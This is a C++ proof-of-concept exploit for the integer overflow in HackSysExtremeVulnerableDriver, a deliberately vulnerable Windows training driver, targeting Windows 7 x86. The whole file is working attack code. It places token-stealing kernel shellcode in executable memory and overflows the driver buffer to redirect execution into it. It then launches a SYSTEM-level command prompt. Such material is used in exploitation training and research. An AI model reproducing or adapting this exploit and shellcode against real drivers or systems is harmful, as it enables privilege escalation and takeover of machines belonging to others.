#include <windows.h>
#include <iostream>
#include <tchar.h>
#include <string>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL 0x222027
#define SIZE 2088 + 4 + 4 // 2096

int main(){
    std::cout << "[+] HEVD - Integer overflow Windows 7 x86 exploit POC\n\n";
    HANDLE hDevice = CreateFileA(DEVICE_NAME,
                                 GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL,
                                 OPEN_EXISTING,
                                 FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
                                 NULL);

    if (hDevice == INVALID_HANDLE_VALUE){
        std::cout << "\t[!] Failed to establish a device handler" << GetLastError() << std::endl;
    } else {
        std::cout << "\t[+] Established a handle to the device - " << DEVICE_NAME << std::endl;
    }

    // --------------------------------------------------------------------------- //
    //                  Preparing the shellcode payload to be send
    // --------------------------------------------------------------------------- //
    char shellcodePayload[] = (
               "\x60"
               "\x64\x8b\x80\x24\x01\x00\x00"
               "\x8b\x40\x50"
               "\x89\xc1"
               "\xba\x04\x00\x00\x00"
               "\x8b\x80\xb8\x00\x00\x00"
               "\x2d\xb8\x00\x00\x00"
               "\x39\x90\xb4\x00\x00\x00"
               "\x75\xed"
               "\x8b\x90\xf8\x00\x00\x00"
               "\x89\x91\xf8\x00\x00\x00"
               "\x61"
               "\x31\xC0"
               "\x5D"
               "\xC2\x08\x00"
               );

    LPVOID shellcode_address = VirtualAlloc(NULL,
                                            sizeof(shellcodePayload),
                                            MEM_RESERVE | MEM_COMMIT,
                                            PAGE_EXECUTE_READWRITE);

    memcpy(shellcode_address, shellcodePayload , sizeof(shellcodePayload));
    std::cout << "\t[+] Shellcode allocated at " << std::hex << shellcode_address << std::endl;

    // --------------------------------------------------------------------------- //
    //                  Now we prepare the user buffer to be sent
    // --------------------------------------------------------------------------- //

    std::cout << "\t[+] Preparing the buffer payload\n";

    BYTE userBuffer[SIZE] = { 0 };
    memset(userBuffer, '\x41', SIZE - 8); // setting the buffer up to EIP

    std::cout << "\t[+] Allocating the user-mode buffer - " << sizeof(userBuffer) << std::endl;

    memcpy(userBuffer + SIZE - 8, &shellcode_address, 0x4); // put the shellcode address right after the buffer

    std::cout << "\t[+] Preparing terminator bytes\n";
    BYTE terminator[] = "\xb0\xb0\xd0\xba";

    RtlCopyMemory(userBuffer + SIZE - 4, terminator, 4);

    DWORD sizeReturn = 0x0;
    BOOL deviceCom = DeviceIoControl(hDevice,
                    IOCTL,
                    userBuffer,
                    0xffffffff,
                    NULL,
                    0,
                    &sizeReturn,
                    NULL);
    if(deviceCom){
        std::cout << "\t[+] Successfully send buffer payload to the driver\n";
        std::cout << "\t[+] Spawning NT SYSTEM cmd prompt, enjoy!\n";
        
        STARTUPINFO StartupInfo;
        PROCESS_INFORMATION ProcessInformation;

        SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
        SecureZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

        BOOL aCreated;
        aCreated = CreateProcessA("C:\\Windows\\System32\\cmd.exe",
                                  NULL,
                                  NULL,
                                  NULL,
                                  FALSE,
                                  0,
                                  NULL,
                                  NULL,
                                  &StartupInfo, &ProcessInformation);
    } else {
        std::cout << "\t[!] Failed to send payload to the device driver\n";
    }
    return 0;
}
